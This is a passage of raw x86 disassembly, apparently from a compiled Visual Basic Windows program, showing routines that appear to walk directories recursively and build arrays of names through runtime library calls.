  402ffe:	c7 85 64 ff ff ff 08 	movl   $0x4008,-0x9c(%ebp)
  403005:	40 00 00 
  403008:	6a 13                	push   $0x13
  40300a:	8d 95 64 ff ff ff    	lea    -0x9c(%ebp),%edx
  403010:	52                   	push   %edx
  403011:	ff 15 d0 10 40 00    	call   *0x4010d0
  403017:	8b d0                	mov    %eax,%edx
  403019:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40301c:	ff 15 14 11 40 00    	call   *0x401114
  403022:	c7 45 fc 07 00 00 00 	movl   $0x7,-0x4(%ebp)
  403029:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40302c:	50                   	push   %eax
  40302d:	68 14 28 40 00       	push   $0x402814
  403032:	ff 15 70 10 40 00    	call   *0x401070
  403038:	85 c0                	test   %eax,%eax
  40303a:	0f 84 91 02 00 00    	je     0x4032d1
  403040:	c7 45 fc 08 00 00 00 	movl   $0x8,-0x4(%ebp)
  403047:	ff 15 54 10 40 00    	call   *0x401054
  40304d:	c7 45 fc 09 00 00 00 	movl   $0x9,-0x4(%ebp)
  403054:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  403057:	51                   	push   %ecx
  403058:	8b 55 d8             	mov    -0x28(%ebp),%edx
  40305b:	52                   	push   %edx
  40305c:	ff 15 30 10 40 00    	call   *0x401030
  403062:	8b d0                	mov    %eax,%edx
  403064:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  403067:	ff 15 14 11 40 00    	call   *0x401114
  40306d:	50                   	push   %eax
  40306e:	ff 15 08 11 40 00    	call   *0x401108
  403074:	83 e0 10             	and    $0x10,%eax
  403077:	33 c9                	xor    %ecx,%ecx
  403079:	83 f8 10             	cmp    $0x10,%eax
  40307c:	0f 94 c1             	sete   %cl
  40307f:	f7 d9                	neg    %ecx
  403081:	66 89 8d 50 ff ff ff 	mov    %cx,-0xb0(%ebp)
  403088:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  40308b:	ff 15 28 11 40 00    	call   *0x401128
  403091:	0f bf 95 50 ff ff ff 	movswl -0xb0(%ebp),%edx
  403098:	85 d2                	test   %edx,%edx
  40309a:	0f 84 01 01 00 00    	je     0x4031a1
  4030a0:	c7 45 fc 0a 00 00 00 	movl   $0xa,-0x4(%ebp)
  4030a7:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4030aa:	50                   	push   %eax
  4030ab:	68 80 2a 40 00       	push   $0x402a80
  4030b0:	ff 15 70 10 40 00    	call   *0x401070
  4030b6:	8b f0                	mov    %eax,%esi
  4030b8:	f7 de                	neg    %esi
  4030ba:	1b f6                	sbb    %esi,%esi
  4030bc:	46                   	inc    %esi
  4030bd:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  4030c0:	51                   	push   %ecx
  4030c1:	68 88 2a 40 00       	push   $0x402a88
  4030c6:	ff 15 70 10 40 00    	call   *0x401070
  4030cc:	f7 d8                	neg    %eax
  4030ce:	1b c0                	sbb    %eax,%eax
  4030d0:	40                   	inc    %eax
  4030d1:	0b f0                	or     %eax,%esi
  4030d3:	85 f6                	test   %esi,%esi
  4030d5:	0f 85 c1 00 00 00    	jne    0x40319c
  4030db:	c7 45 fc 0b 00 00 00 	movl   $0xb,-0x4(%ebp)
  4030e2:	8b 55 cc             	mov    -0x34(%ebp),%edx
  4030e5:	83 c2 01             	add    $0x1,%edx
  4030e8:	0f 80 6d 03 00 00    	jo     0x40345b
  4030ee:	89 55 cc             	mov    %edx,-0x34(%ebp)
  4030f1:	c7 45 fc 0c 00 00 00 	movl   $0xc,-0x4(%ebp)
  4030f8:	6a 00                	push   $0x0
  4030fa:	8b 45 cc             	mov    -0x34(%ebp),%eax
  4030fd:	50                   	push   %eax
  4030fe:	6a 01                	push   $0x1
  403100:	6a 08                	push   $0x8
  403102:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  403105:	51                   	push   %ecx
  403106:	6a 04                	push   $0x4
  403108:	68 80 01 00 00       	push   $0x180
  40310d:	ff 15 84 10 40 00    	call   *0x401084
  403113:	83 c4 1c             	add    $0x1c,%esp
  403116:	c7 45 fc 0d 00 00 00 	movl   $0xd,-0x4(%ebp)
  40311d:	83 7d d4 00          	cmpl   $0x0,-0x2c(%ebp)
  403121:	74 58                	je     0x40317b
  403123:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  403126:	66 83 3a 01          	cmpw   $0x1,(%edx)
  40312a:	75 4f                	jne    0x40317b
  40312c:	8b 45 cc             	mov    -0x34(%ebp),%eax
  40312f:	83 e8 01             	sub    $0x1,%eax
  403132:	0f 80 23 03 00 00    	jo     0x40345b
  403138:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  40313b:	2b 41 14             	sub    0x14(%ecx),%eax
  40313e:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  403144:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  403147:	8b 85 50 ff ff ff    	mov    -0xb0(%ebp),%eax
  40314d:	3b 42 10             	cmp    0x10(%edx),%eax
  403150:	73 0c                	jae    0x40315e
  403152:	c7 85 30 ff ff ff 00 	movl   $0x0,-0xd0(%ebp)
  403159:	00 00 00 
  40315c:	eb 0c                	jmp    0x40316a
  40315e:	ff 15 6c 10 40 00    	call   *0x40106c
  403164:	89 85 30 ff ff ff    	mov    %eax,-0xd0(%ebp)
  40316a:	8b 8d 50 ff ff ff    	mov    -0xb0(%ebp),%ecx
  403170:	c1 e1 02             	shl    $0x2,%ecx
  403173:	89 8d 2c ff ff ff    	mov    %ecx,-0xd4(%ebp)
  403179:	eb 0c                	jmp    0x403187
  40317b:	ff 15 6c 10 40 00    	call   *0x40106c
  403181:	89 85 2c ff ff ff    	mov    %eax,-0xd4(%ebp)
  403187:	8b 55 d8             	mov    -0x28(%ebp),%edx
  40318a:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40318d:	8b 48 0c             	mov    0xc(%eax),%ecx
  403190:	03 8d 2c ff ff ff    	add    -0xd4(%ebp),%ecx
  403196:	ff 15 ec 10 40 00    	call   *0x4010ec
  40319c:	e9 f6 00 00 00       	jmp    0x403297
  4031a1:	c7 45 fc 10 00 00 00 	movl   $0x10,-0x4(%ebp)
  4031a8:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4031ab:	8b 11                	mov    (%ecx),%edx
  4031ad:	52                   	push   %edx
  4031ae:	68 14 28 40 00       	push   $0x402814
  4031b3:	ff 15 70 10 40 00    	call   *0x401070
  4031b9:	85 c0                	test   %eax,%eax
  4031bb:	75 05                	jne    0x4031c2
  4031bd:	e9 d5 00 00 00       	jmp    0x403297
  4031c2:	c7 45 fc 11 00 00 00 	movl   $0x11,-0x4(%ebp)
  4031c9:	8b 45 c8             	mov    -0x38(%ebp),%eax
  4031cc:	50                   	push   %eax
  4031cd:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  4031d0:	51                   	push   %ecx
  4031d1:	ff 15 30 10 40 00    	call   *0x401030
  4031d7:	8b d0                	mov    %eax,%edx
  4031d9:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  4031dc:	ff 15 14 11 40 00    	call   *0x401114
  4031e2:	8d 55 c4             	lea    -0x3c(%ebp),%edx
  4031e5:	52                   	push   %edx
  4031e6:	e8 85 02 00 00       	call   0x403470
  4031eb:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4031ee:	c7 45 b4 08 00 00 00 	movl   $0x8,-0x4c(%ebp)
  4031f5:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  4031f8:	50                   	push   %eax
  4031f9:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  4031fc:	51                   	push   %ecx
  4031fd:	ff 15 2c 10 40 00    	call   *0x40102c
  403203:	8b 55 0c             	mov    0xc(%ebp),%edx
  403206:	52                   	push   %edx
  403207:	e8 64 02 00 00       	call   0x403470
  40320c:	89 45 9c             	mov    %eax,-0x64(%ebp)
  40320f:	c7 45 94 08 00 00 00 	movl   $0x8,-0x6c(%ebp)
  403216:	8d 45 94             	lea    -0x6c(%ebp),%eax
  403219:	50                   	push   %eax
  40321a:	8d 4d 84             	lea    -0x7c(%ebp),%ecx
  40321d:	51                   	push   %ecx
  40321e:	ff 15 2c 10 40 00    	call   *0x40102c
  403224:	8d 55 a4             	lea    -0x5c(%ebp),%edx
  403227:	52                   	push   %edx
  403228:	8d 45 84             	lea    -0x7c(%ebp),%eax
  40322b:	50                   	push   %eax
  40322c:	ff 15 78 10 40 00    	call   *0x401078
  403232:	66 89 85 50 ff ff ff 	mov    %ax,-0xb0(%ebp)
  403239:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  40323c:	ff 15 28 11 40 00    	call   *0x401128
  403242:	8d 4d 84             	lea    -0x7c(%ebp),%ecx
  403245:	51                   	push   %ecx
  403246:	8d 55 a4             	lea    -0x5c(%ebp),%edx
  403249:	52                   	push   %edx
  40324a:	8d 45 94             	lea    -0x6c(%ebp),%eax
  40324d:	50                   	push   %eax
  40324e:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  403251:	51                   	push   %ecx
  403252:	6a 04                	push   $0x4
  403254:	ff 15 20 10 40 00    	call   *0x401020
  40325a:	83 c4 14             	add    $0x14,%esp
  40325d:	0f bf 95 50 ff ff ff 	movswl -0xb0(%ebp),%edx
  403264:	85 d2                	test   %edx,%edx
  403266:	74 2f                	je     0x403297
  403268:	c7 45 fc 12 00 00 00 	movl   $0x12,-0x4(%ebp)
  40326f:	8b 45 c8             	mov    -0x38(%ebp),%eax
  403272:	50                   	push   %eax
  403273:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  403276:	51                   	push   %ecx
  403277:	ff 15 30 10 40 00    	call   *0x401030
  40327d:	8b d0                	mov    %eax,%edx
  40327f:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  403282:	ff 15 14 11 40 00    	call   *0x401114
  403288:	50                   	push   %eax
  403289:	e8 a2 04 00 00       	call   0x403730
  40328e:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  403291:	ff 15 28 11 40 00    	call   *0x401128
  403297:	c7 45 fc 15 00 00 00 	movl   $0x15,-0x4(%ebp)
  40329e:	c7 45 bc 04 00 02 80 	movl   $0x80020004,-0x44(%ebp)
  4032a5:	c7 45 b4 0a 00 00 00 	movl   $0xa,-0x4c(%ebp)
  4032ac:	6a 00                	push   $0x0
  4032ae:	8d 55 b4             	lea    -0x4c(%ebp),%edx
  4032b1:	52                   	push   %edx
  4032b2:	ff 15 d0 10 40 00    	call   *0x4010d0
  4032b8:	8b d0                	mov    %eax,%edx
  4032ba:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4032bd:	ff 15 14 11 40 00    	call   *0x401114
  4032c3:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  4032c6:	ff 15 10 10 40 00    	call   *0x401010
  4032cc:	e9 51 fd ff ff       	jmp    0x403022
  4032d1:	c7 45 fc 17 00 00 00 	movl   $0x17,-0x4(%ebp)
  4032d8:	8b 45 cc             	mov    -0x34(%ebp),%eax
  4032db:	83 e8 01             	sub    $0x1,%eax
  4032de:	0f 80 77 01 00 00    	jo     0x40345b
  4032e4:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  4032ea:	c7 85 4c ff ff ff 01 	movl   $0x1,-0xb4(%ebp)
  4032f1:	00 00 00 
  4032f4:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  4032fb:	eb 12                	jmp    0x40330f
  4032fd:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  403300:	03 8d 4c ff ff ff    	add    -0xb4(%ebp),%ecx
  403306:	0f 80 4f 01 00 00    	jo     0x40345b
  40330c:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  40330f:	8b 55 dc             	mov    -0x24(%ebp),%edx
  403312:	3b 95 48 ff ff ff    	cmp    -0xb8(%ebp),%edx
  403318:	0f 8f ac 00 00 00    	jg     0x4033ca
  40331e:	c7 45 fc 18 00 00 00 	movl   $0x18,-0x4(%ebp)
  403325:	83 7d d4 00          	cmpl   $0x0,-0x2c(%ebp)
  403329:	74 4f                	je     0x40337a
  40332b:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40332e:	66 83 38 01          	cmpw   $0x1,(%eax)
  403332:	75 46                	jne    0x40337a
  403334:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  403337:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40333a:	2b 51 14             	sub    0x14(%ecx),%edx
  40333d:	89 95 50 ff ff ff    	mov    %edx,-0xb0(%ebp)
  403343:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  403346:	8b 8d 50 ff ff ff    	mov    -0xb0(%ebp),%ecx
  40334c:	3b 48 10             	cmp    0x10(%eax),%ecx
  40334f:	73 0c                	jae    0x40335d
  403351:	c7 85 28 ff ff ff 00 	movl   $0x0,-0xd8(%ebp)
  403358:	00 00 00 
  40335b:	eb 0c                	jmp    0x403369
  40335d:	ff 15 6c 10 40 00    	call   *0x40106c
  403363:	89 85 28 ff ff ff    	mov    %eax,-0xd8(%ebp)
  403369:	8b 95 50 ff ff ff    	mov    -0xb0(%ebp),%edx
  40336f:	c1 e2 02             	shl    $0x2,%edx
  403372:	89 95 24 ff ff ff    	mov    %edx,-0xdc(%ebp)
  403378:	eb 0c                	jmp    0x403386
  40337a:	ff 15 6c 10 40 00    	call   *0x40106c
  403380:	89 85 24 ff ff ff    	mov    %eax,-0xdc(%ebp)
  403386:	8b 45 0c             	mov    0xc(%ebp),%eax
  403389:	50                   	push   %eax
  40338a:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  40338d:	51                   	push   %ecx
  40338e:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  403391:	8b 42 0c             	mov    0xc(%edx),%eax
  403394:	8b 8d 24 ff ff ff    	mov    -0xdc(%ebp),%ecx
  40339a:	8b 14 08             	mov    (%eax,%ecx,1),%edx
  40339d:	52                   	push   %edx
  40339e:	ff 15 30 10 40 00    	call   *0x401030
  4033a4:	8b d0                	mov    %eax,%edx
  4033a6:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  4033a9:	ff 15 14 11 40 00    	call   *0x401114
  4033af:	50                   	push   %eax
  4033b0:	e8 4b fb ff ff       	call   0x402f00
  4033b5:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  4033b8:	ff 15 28 11 40 00    	call   *0x401128
  4033be:	c7 45 fc 19 00 00 00 	movl   $0x19,-0x4(%ebp)
  4033c5:	e9 33 ff ff ff       	jmp    0x4032fd
  4033ca:	c7 45 fc 1a 00 00 00 	movl   $0x1a,-0x4(%ebp)
  4033d1:	6a 00                	push   $0x0
  4033d3:	6a 00                	push   $0x0
  4033d5:	6a 01                	push   $0x1
  4033d7:	6a 08                	push   $0x8
  4033d9:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  4033dc:	50                   	push   %eax
  4033dd:	6a 04                	push   $0x4
  4033df:	68 80 01 00 00       	push   $0x180
  4033e4:	ff 15 90 10 40 00    	call   *0x401090
  4033ea:	83 c4 1c             	add    $0x1c,%esp
  4033ed:	68 48 34 40 00       	push   $0x403448
  4033f2:	eb 2c                	jmp    0x403420
  4033f4:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  4033f7:	ff 15 28 11 40 00    	call   *0x401128
  4033fd:	8d 8d 74 ff ff ff    	lea    -0x8c(%ebp),%ecx
  403403:	51                   	push   %ecx
  403404:	8d 55 84             	lea    -0x7c(%ebp),%edx
  403407:	52                   	push   %edx
  403408:	8d 45 94             	lea    -0x6c(%ebp),%eax
  40340b:	50                   	push   %eax
  40340c:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  40340f:	51                   	push   %ecx
  403410:	8d 55 b4             	lea    -0x4c(%ebp),%edx
  403413:	52                   	push   %edx
  403414:	6a 05                	push   $0x5
  403416:	ff 15 20 10 40 00    	call   *0x401020
  40341c:	83 c4 18             	add    $0x18,%esp
  40341f:	c3                   	ret
  403420:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  403423:	ff 15 28 11 40 00    	call   *0x401128
  403429:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40342c:	50                   	push   %eax
  40342d:	6a 00                	push   $0x0
  40342f:	ff 15 44 10 40 00    	call   *0x401044
  403435:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  403438:	ff 15 2c 11 40 00    	call   *0x40112c
  40343e:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  403441:	ff 15 28 11 40 00    	call   *0x401128
  403447:	c3                   	ret
  403448:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  40344b:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403452:	5f                   	pop    %edi
  403453:	5e                   	pop    %esi
  403454:	5b                   	pop    %ebx
  403455:	8b e5                	mov    %ebp,%esp
  403457:	5d                   	pop    %ebp
  403458:	c2 08 00             	ret    $0x8
  40345b:	ff 15 d8 10 40 00    	call   *0x4010d8
  403461:	cc                   	int3
  403462:	cc                   	int3
  403463:	cc                   	int3
  403464:	cc                   	int3
  403465:	cc                   	int3
  403466:	cc                   	int3
  403467:	cc                   	int3
  403468:	cc                   	int3
  403469:	cc                   	int3
  40346a:	cc                   	int3
  40346b:	cc                   	int3
  40346c:	cc                   	int3
  40346d:	cc                   	int3
  40346e:	cc                   	int3
  40346f:	cc                   	int3
  403470:	55                   	push   %ebp
  403471:	8b ec                	mov    %esp,%ebp
  403473:	83 ec 0c             	sub    $0xc,%esp
  403476:	68 16 12 40 00       	push   $0x401216
  40347b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403481:	50                   	push   %eax
  403482:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403489:	83 ec 60             	sub    $0x60,%esp
  40348c:	53                   	push   %ebx
  40348d:	56                   	push   %esi
  40348e:	57                   	push   %edi
  40348f:	89 65 f4             	mov    %esp,-0xc(%ebp)
  403492:	c7 45 f8 d8 11 40 00 	movl   $0x4011d8,-0x8(%ebp)
  403499:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40349c:	33 c0                	xor    %eax,%eax
  40349e:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4034a1:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4034a4:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4034a7:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4034aa:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4034ad:	89 45 ac             	mov    %eax,-0x54(%ebp)
  4034b0:	8b 03                	mov    (%ebx),%eax
  4034b2:	50                   	push   %eax
  4034b3:	ff 15 14 10 40 00    	call   *0x401014
  4034b9:	8b 3d 14 11 40 00    	mov    0x401114,%edi
  4034bf:	8b f0                	mov    %eax,%esi
  4034c1:	b8 01 00 00 00       	mov    $0x1,%eax
  4034c6:	3b f0                	cmp    %eax,%esi
  4034c8:	0f 8c 81 00 00 00    	jl     0x40354f
  4034ce:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  4034d1:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4034d4:	51                   	push   %ecx
  4034d5:	8d 55 ac             	lea    -0x54(%ebp),%edx
  4034d8:	56                   	push   %esi
  4034d9:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4034dc:	52                   	push   %edx
  4034dd:	50                   	push   %eax
  4034de:	c7 45 cc 02 00 00 00 	movl   $0x2,-0x34(%ebp)
  4034e5:	89 5d b4             	mov    %ebx,-0x4c(%ebp)
  4034e8:	c7 45 ac 08 40 00 00 	movl   $0x4008,-0x54(%ebp)
  4034ef:	ff 15 5c 10 40 00    	call   *0x40105c
  4034f5:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  4034f8:	51                   	push   %ecx
  4034f9:	ff 15 18 10 40 00    	call   *0x401018
  4034ff:	8b d0                	mov    %eax,%edx
  403501:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  403504:	ff d7                	call   *%edi
  403506:	8d 55 bc             	lea    -0x44(%ebp),%edx
  403509:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40350c:	52                   	push   %edx
  40350d:	50                   	push   %eax
  40350e:	6a 02                	push   $0x2
  403510:	ff 15 20 10 40 00    	call   *0x401020
  403516:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  403519:	83 c4 0c             	add    $0xc,%esp
  40351c:	51                   	push   %ecx
  40351d:	68 80 2a 40 00       	push   $0x402a80
  403522:	ff 15 70 10 40 00    	call   *0x401070
  403528:	85 c0                	test   %eax,%eax
  40352a:	74 23                	je     0x40354f
  40352c:	8b 55 e0             	mov    -0x20(%ebp),%edx
  40352f:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403532:	52                   	push   %edx
  403533:	50                   	push   %eax
  403534:	ff 15 30 10 40 00    	call   *0x401030
  40353a:	8b d0                	mov    %eax,%edx
  40353c:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  40353f:	ff d7                	call   *%edi
  403541:	83 c8 ff             	or     $0xffffffff,%eax
  403544:	03 c6                	add    %esi,%eax
  403546:	70 64                	jo     0x4035ac
  403548:	8b f0                	mov    %eax,%esi
  40354a:	e9 72 ff ff ff       	jmp    0x4034c1
  40354f:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  403552:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  403555:	ff 15 ec 10 40 00    	call   *0x4010ec
  40355b:	68 96 35 40 00       	push   $0x403596
  403560:	eb 23                	jmp    0x403585
  403562:	f6 45 fc 04          	testb  $0x4,-0x4(%ebp)
  403566:	74 09                	je     0x403571
  403568:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40356b:	ff 15 28 11 40 00    	call   *0x401128
  403571:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  403574:	8d 55 cc             	lea    -0x34(%ebp),%edx
  403577:	51                   	push   %ecx
  403578:	52                   	push   %edx
  403579:	6a 02                	push   $0x2
  40357b:	ff 15 20 10 40 00    	call   *0x401020
  403581:	83 c4 0c             	add    $0xc,%esp
  403584:	c3                   	ret
  403585:	8b 35 28 11 40 00    	mov    0x401128,%esi
  40358b:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  40358e:	ff d6                	call   *%esi
  403590:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  403593:	ff d6                	call   *%esi
  403595:	c3                   	ret
  403596:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  403599:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40359c:	5f                   	pop    %edi
  40359d:	5e                   	pop    %esi
  40359e:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4035a5:	5b                   	pop    %ebx
  4035a6:	8b e5                	mov    %ebp,%esp
  4035a8:	5d                   	pop    %ebp
  4035a9:	c2 04 00             	ret    $0x4
  4035ac:	ff 15 d8 10 40 00    	call   *0x4010d8
  4035b2:	90                   	nop
  4035b3:	90                   	nop
  4035b4:	90                   	nop
  4035b5:	90                   	nop
  4035b6:	90                   	nop
  4035b7:	90                   	nop
  4035b8:	90                   	nop
  4035b9:	90                   	nop
  4035ba:	90                   	nop
  4035bb:	90                   	nop
  4035bc:	90                   	nop
  4035bd:	90                   	nop
  4035be:	90                   	nop
  4035bf:	90                   	nop
  4035c0:	55                   	push   %ebp
  4035c1:	8b ec                	mov    %esp,%ebp
  4035c3:	83 ec 0c             	sub    $0xc,%esp
  4035c6:	68 16 12 40 00       	push   $0x401216
  4035cb:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4035d1:	50                   	push   %eax
  4035d2:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4035d9:	83 ec 50             	sub    $0x50,%esp
  4035dc:	53                   	push   %ebx
  4035dd:	56                   	push   %esi
  4035de:	57                   	push   %edi
  4035df:	89 65 f4             	mov    %esp,-0xc(%ebp)
  4035e2:	c7 45 f8 e8 11 40 00 	movl   $0x4011e8,-0x8(%ebp)
  4035e9:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4035ec:	33 f6                	xor    %esi,%esi
  4035ee:	50                   	push   %eax
  4035ef:	68 ff 00 00 00       	push   $0xff
  4035f4:	89 75 e8             	mov    %esi,-0x18(%ebp)
  4035f7:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4035fa:	89 75 dc             	mov    %esi,-0x24(%ebp)
  4035fd:	89 75 d8             	mov    %esi,-0x28(%ebp)
  403600:	89 75 c8             	mov    %esi,-0x38(%ebp)
  403603:	89 75 b8             	mov    %esi,-0x48(%ebp)
  403606:	89 75 a8             	mov    %esi,-0x58(%ebp)
  403609:	ff 15 8c 10 40 00    	call   *0x40108c
  40360f:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  403612:	68 ff 00 00 00       	push   $0xff
  403617:	8d 55 dc             	lea    -0x24(%ebp),%edx
  40361a:	51                   	push   %ecx
  40361b:	52                   	push   %edx
  40361c:	ff 15 0c 11 40 00    	call   *0x40110c
  403622:	50                   	push   %eax
  403623:	56                   	push   %esi
  403624:	e8 2f f4 ff ff       	call   0x402a58
  403629:	8b f8                	mov    %eax,%edi
  40362b:	ff 15 38 10 40 00    	call   *0x401038
  403631:	8b 45 dc             	mov    -0x24(%ebp),%eax
  403634:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  403637:	50                   	push   %eax
  403638:	51                   	push   %ecx
  403639:	ff 15 a4 10 40 00    	call   *0x4010a4
  40363f:	8b 55 e0             	mov    -0x20(%ebp),%edx
  403642:	8b 1d 34 10 40 00    	mov    0x401034,%ebx
  403648:	50                   	push   %eax
  403649:	52                   	push   %edx
  40364a:	56                   	push   %esi
  40364b:	ff d3                	call   *%ebx
  40364d:	8b cf                	mov    %edi,%ecx
  40364f:	ff 15 7c 10 40 00    	call   *0x40107c
  403655:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  403658:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40365b:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40365e:	50                   	push   %eax
  40365f:	51                   	push   %ecx
  403660:	6a 02                	push   $0x2
  403662:	ff 15 f0 10 40 00    	call   *0x4010f0
  403668:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  40366b:	83 c4 0c             	add    $0xc,%esp
  40366e:	89 55 b0             	mov    %edx,-0x50(%ebp)
  403671:	8b 55 e0             	mov    -0x20(%ebp),%edx
  403674:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  403677:	c7 45 a8 02 40 00 00 	movl   $0x4002,-0x58(%ebp)
  40367e:	ff 15 ec 10 40 00    	call   *0x4010ec
  403684:	8d 45 dc             	lea    -0x24(%ebp),%eax
  403687:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  40368a:	89 45 c0             	mov    %eax,-0x40(%ebp)
  40368d:	51                   	push   %ecx
  40368e:	8d 55 b8             	lea    -0x48(%ebp),%edx
  403691:	6a 01                	push   $0x1
  403693:	8d 45 c8             	lea    -0x38(%ebp),%eax
  403696:	52                   	push   %edx
  403697:	50                   	push   %eax
  403698:	c7 45 b8 08 40 00 00 	movl   $0x4008,-0x48(%ebp)
  40369f:	ff 15 5c 10 40 00    	call   *0x40105c
  4036a5:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4036a8:	8b 55 e0             	mov    -0x20(%ebp),%edx
  4036ab:	51                   	push   %ecx
  4036ac:	52                   	push   %edx
  4036ad:	56                   	push   %esi
  4036ae:	ff d3                	call   *%ebx
  4036b0:	8d 45 c8             	lea    -0x38(%ebp),%eax
  4036b3:	50                   	push   %eax
  4036b4:	ff 15 18 10 40 00    	call   *0x401018
  4036ba:	8b d0                	mov    %eax,%edx
  4036bc:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4036bf:	ff 15 14 11 40 00    	call   *0x401114
  4036c5:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4036c8:	ff 15 28 11 40 00    	call   *0x401128
  4036ce:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  4036d1:	ff 15 10 10 40 00    	call   *0x401010
  4036d7:	68 14 37 40 00       	push   $0x403714
  4036dc:	eb 2c                	jmp    0x40370a
  4036de:	f6 45 fc 04          	testb  $0x4,-0x4(%ebp)
  4036e2:	74 09                	je     0x4036ed
  4036e4:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4036e7:	ff 15 28 11 40 00    	call   *0x401128
  4036ed:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4036f0:	8d 55 dc             	lea    -0x24(%ebp),%edx
  4036f3:	51                   	push   %ecx
  4036f4:	52                   	push   %edx
  4036f5:	6a 02                	push   $0x2
  4036f7:	ff 15 f0 10 40 00    	call   *0x4010f0
  4036fd:	83 c4 0c             	add    $0xc,%esp
  403700:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  403703:	ff 15 10 10 40 00    	call   *0x401010
  403709:	c3                   	ret
  40370a:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40370d:	ff 15 28 11 40 00    	call   *0x401128
  403713:	c3                   	ret
  403714:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  403717:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40371a:	5f                   	pop    %edi
  40371b:	5e                   	pop    %esi
  40371c:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403723:	5b                   	pop    %ebx
  403724:	8b e5                	mov    %ebp,%esp
  403726:	5d                   	pop    %ebp
  403727:	c3                   	ret
  403728:	90                   	nop
  403729:	90                   	nop
  40372a:	90                   	nop
  40372b:	90                   	nop
  40372c:	90                   	nop
  40372d:	90                   	nop
  40372e:	90                   	nop
  40372f:	90                   	nop
  403730:	55                   	push   %ebp
  403731:	8b ec                	mov    %esp,%ebp
  403733:	83 ec 08             	sub    $0x8,%esp
  403736:	68 16 12 40 00       	push   $0x401216
